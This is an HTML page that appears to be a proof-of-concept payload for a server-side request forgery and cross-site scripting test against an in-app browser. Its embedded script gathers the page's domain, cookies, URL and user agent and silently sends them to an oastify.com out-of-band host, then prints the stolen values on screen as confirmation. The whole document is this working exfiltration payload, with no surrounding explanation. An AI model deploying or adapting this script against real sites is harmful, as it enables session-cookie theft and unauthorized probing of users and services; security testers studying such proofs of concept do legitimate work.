<!DOCTYPE html>
<html>
<head>
  <title>SSRF + XSS</title>
  <style>
    * { margin: 0; padding: 0; }
    body {
      background: #c00;
      color: white;
      font-family: 'Courier New', monospace;
      text-align: center;
      padding: 40px;
    }
    .box {
      background: rgba(0,0,0,0.7);
      padding: 30px;
      border-radius: 15px;
      display: inline-block;
      max-width: 90%;
      box-shadow: 0 0 20px #000;
    }
    h1 { font-size: 32px; margin-bottom: 15px; }
    p { font-size: 18px; margin: 10px 0; }
    .data {
      background: #000;
      color: #0f0;
      padding: 12px;
      border-radius: 8px;
      margin: 15px 0;
      text-align: left;
      font-family: monospace;
      word-break: break-all;
    }
    .oast { color: #ff0; font-weight: bold; }
  </style>
</head>
<body>
  <div class="box">
    <h1>SSRF + XSS CONFIRMED</h1>
    <p>JavaScript is executing in the in-app browser.</p>
    <p>Data sent to: <span class="oast">1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com</span></p>

    <div class="data" id="output">Sending data...</div>
  </div>

  <script>
    // === OASTIFY DATA EXFILTRATION ===
    const oast = 'https://1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com';

    const payload = new URLSearchParams({
      domain: document.domain || 'blocked',
      cookie: document.cookie || 'none',
      url: location.href,
      ua: navigator.userAgent,
      time: Date.now()
    });

    // Fire & forget (no-cors)
    fetch(oast + '?' + payload, { mode: 'no-cors' }).catch(() => {});

    // === VISUAL PROOF ===
    setTimeout(() => {
      document.getElementById('output').innerHTML = `
        <strong>Domain:</strong> ${document.domain || 'blocked'}<br>
        <strong>Cookie:</strong> ${document.cookie || 'none'}<br>
        <strong>URL:</strong> ${location.href}<br>
        <strong>OAST HIT!</strong> Check your dashboard.
      `;
    }, 800);
  </script>
</body>
</html>
